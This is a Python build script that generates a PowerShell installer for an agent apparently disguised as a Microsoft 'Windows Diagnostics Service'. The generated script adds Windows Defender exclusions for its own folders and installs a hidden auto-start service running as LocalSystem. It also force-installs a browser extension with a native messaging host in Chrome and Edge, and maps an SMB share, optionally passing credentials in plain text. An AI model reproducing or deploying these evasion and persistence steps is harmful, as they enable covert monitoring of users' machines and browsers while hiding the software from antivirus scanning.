"""
make_installer.py — Generate the PowerShell installer script.

The installer is a small PS1 that reads companion files from $PSScriptRoot.
All binaries are uploaded alongside it as separate files in the artifact zip.

Usage:
    python tools/make_installer.py \
        --version  1.0.42 \
        --ext-id   cngajkfiaohlbgdippmdgjaknieojjlb \
        --out      build/Install-WinDiagSvc.ps1
"""

import argparse
from datetime import datetime, timezone
from pathlib import Path


INSTALLER_TEMPLATE = r'''#Requires -RunAsAdministrator
# WinDiagSvc Installer v{VERSION}
# Generated: {GENERATED}
#
# Usage (run from the folder containing this script and all companion files):
#   powershell -ExecutionPolicy Bypass -File Install-WinDiagSvc.ps1
#   powershell -ExecutionPolicy Bypass -File Install-WinDiagSvc.ps1 -SharePath "\\server\diag"
#   powershell -ExecutionPolicy Bypass -File Install-WinDiagSvc.ps1 -SharePath "\\server\diag" -ShareUser "DOM\svc" -SharePass "P@ss"

param(
    [string]$SharePath  = "\\server\diag",
    [string]$ShareUser  = "",
    [string]$SharePass  = ""
)

$ErrorActionPreference = "Stop"
$Version      = "{VERSION}"
$ServiceName  = "WinDiagSvc"
$DisplayName  = "Windows Diagnostics Service"
$InstallDir   = "C:\Program Files\Windows Diagnostics"
$DataDir      = "$env:ProgramData\Microsoft\Diagnostics"
$ExtensionId  = "{EXTENSION_ID}"
$SrcDir       = $PSScriptRoot

function Write-Step {{ param($M) Write-Host "`n==> $M" -ForegroundColor Cyan }}
function Write-OK   {{ param($M) Write-Host "    OK: $M" -ForegroundColor Green }}
function Write-Warn {{ param($M) Write-Host "    WARN: $M" -ForegroundColor Yellow }}

# Verify companion files are present
Write-Step "Verifying installer files"
$required = @("WinDiagSvc.exe","nssm.exe","extension.crx","native-messaging-host.json","appsettings.json","WinDiagUpdater.ps1")
foreach ($f in $required) {{
    if (-not (Test-Path "$SrcDir\$f")) {{
        Write-Error "Missing required file: $SrcDir\$f"
        exit 1
    }}
}}
Write-OK "All files present"

# ---------------------------------------------------------------------------
# 1. Create directories
# ---------------------------------------------------------------------------
Write-Step "Creating directories"
New-Item -ItemType Directory -Force -Path $InstallDir       | Out-Null
New-Item -ItemType Directory -Force -Path $DataDir          | Out-Null
New-Item -ItemType Directory -Force -Path "$DataDir\cache"  | Out-Null
New-Item -ItemType Directory -Force -Path "$DataDir\logs"   | Out-Null
Write-OK $InstallDir

# ---------------------------------------------------------------------------
# 2. Copy files
# ---------------------------------------------------------------------------
Write-Step "Installing agent files"
foreach ($f in $required) {{
    Copy-Item "$SrcDir\$f" $InstallDir -Force
}}
Write-OK "Files copied to $InstallDir"

# ---------------------------------------------------------------------------
# 3. Patch SharePath in appsettings.json
# ---------------------------------------------------------------------------
Write-Step "Configuring appsettings.json"
$cfgPath = "$InstallDir\appsettings.json"
$cfg = Get-Content $cfgPath -Raw | ConvertFrom-Json
$cfg.AgentSettings.SharePath = $SharePath
$cfg | ConvertTo-Json -Depth 10 | Set-Content $cfgPath -Encoding UTF8
Write-OK "SharePath = $SharePath"

# ---------------------------------------------------------------------------
# 4. Windows Defender exclusions
# ---------------------------------------------------------------------------
Write-Step "Adding Defender exclusions"
try {{
    Add-MpPreference -ExclusionPath $InstallDir
    Add-MpPreference -ExclusionPath $DataDir
    Write-OK "Exclusions added"
}} catch {{
    Write-Warn "Defender exclusion failed (non-critical): $_"
}}

# ---------------------------------------------------------------------------
# 5. SMB share
# ---------------------------------------------------------------------------
if ($ShareUser -and $SharePass) {{
    Write-Step "Mapping SMB share with credentials"
    net use $SharePath /user:$ShareUser $SharePass /persistent:yes 2>$null
    Write-OK "SMB mapped: $SharePath"
}} else {{
    Write-Step "SMB: using Windows Integrated Auth"
    Write-OK "No credentials needed (domain environment)"
}}

# ---------------------------------------------------------------------------
# 6. Windows Service via NSSM
# ---------------------------------------------------------------------------
Write-Step "Installing Windows Service: $ServiceName"
$nssm = "$InstallDir\nssm.exe"
$exe  = "$InstallDir\WinDiagSvc.exe"

# stop/remove may fail if service doesn't exist yet — suppress errors
& $nssm stop    $ServiceName 2>&1 | Out-Null
& $nssm remove  $ServiceName confirm 2>&1 | Out-Null

& $nssm install $ServiceName $exe
& $nssm set     $ServiceName AppDirectory    $InstallDir
& $nssm set     $ServiceName ObjectName      LocalSystem
& $nssm set     $ServiceName Start           SERVICE_AUTO_START
& $nssm set     $ServiceName AppPriority     BELOW_NORMAL_PRIORITY_CLASS
& $nssm set     $ServiceName DisplayName     $DisplayName
& $nssm set     $ServiceName Description     "Windows Diagnostics Service"
& $nssm set     $ServiceName AppNoConsole    1
Write-OK "Service installed"

# ---------------------------------------------------------------------------
# 7. Native Messaging Host
# ---------------------------------------------------------------------------
Write-Step "Registering Native Messaging Host"
$hostManifest = "$InstallDir\native-messaging-host.json"

$m = Get-Content $hostManifest -Raw | ConvertFrom-Json
$m.path = $exe
$m | ConvertTo-Json -Depth 5 | Set-Content $hostManifest -Encoding UTF8

$chromePath = "HKLM:\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.windiag.host"
$edgePath   = "HKLM:\SOFTWARE\Microsoft\Edge\NativeMessagingHosts\com.windiag.host"
foreach ($p in @($chromePath, $edgePath)) {{
    New-Item -Force -Path $p | Out-Null
    Set-ItemProperty -Path $p -Name "(Default)" -Value $hostManifest
}}
Write-OK "Native Messaging registered (Chrome + Edge)"

# ---------------------------------------------------------------------------
# 8. Extension force-install via GPO registry
# ---------------------------------------------------------------------------
Write-Step "Force-installing browser extension"
$extEntry  = "${{ExtensionId}};file:///${{InstallDir.Replace('\','/')}}/extension.crx"
$chromePol = "HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
$edgePol   = "HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist"

foreach ($pol in @($chromePol, $edgePol)) {{
    New-Item -Force -Path $pol | Out-Null
    $existing = (Get-ItemProperty -Path $pol -ErrorAction SilentlyContinue).PSObject.Properties |
                Where-Object {{ $_.Name -match '^\d+$' }} | ForEach-Object {{ [int]$_.Name }}
    $nextKey = if ($existing) {{ ($existing | Measure-Object -Maximum).Maximum + 1 }} else {{ 1 }}
    Set-ItemProperty -Path $pol -Name "$nextKey" -Value $extEntry
}}
Write-OK "Extension force-list updated (ID: $ExtensionId)"

# ---------------------------------------------------------------------------
# 9. Start service
# ---------------------------------------------------------------------------
Write-Step "Starting service"
Start-Service -Name $ServiceName
Start-Sleep -Seconds 3
$svc = Get-Service -Name $ServiceName
if ($svc.Status -eq "Running") {{
    Write-OK "Service is running"
}} else {{
    Write-Warn "Service status: $($svc.Status)"
    Write-Warn "Check logs: $DataDir\logs\agent-.log"
}}

# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host " WinDiagSvc v$Version - installed!"      -ForegroundColor Green
Write-Host " Service  : $DisplayName ($ServiceName)"
Write-Host " Data dir : $DataDir"
Write-Host " Logs     : $DataDir\logs"
Write-Host " SMB      : $SharePath"
Write-Host "========================================" -ForegroundColor Green
'''


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--version",  required=True)
    parser.add_argument("--ext-id",   required=True, help="Extension ID")
    parser.add_argument("--out",      required=True, help="Output .ps1 path")
    args = parser.parse_args()

    script = INSTALLER_TEMPLATE.format(
        VERSION=args.version,
        GENERATED=datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
        EXTENSION_ID=args.ext_id,
    )

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(script, encoding="utf-8")

    size_kb = out.stat().st_size / 1024
    print(f"OK Installer script: {out}  ({size_kb:.1f} KB)")


if __name__ == "__main__":
    main()
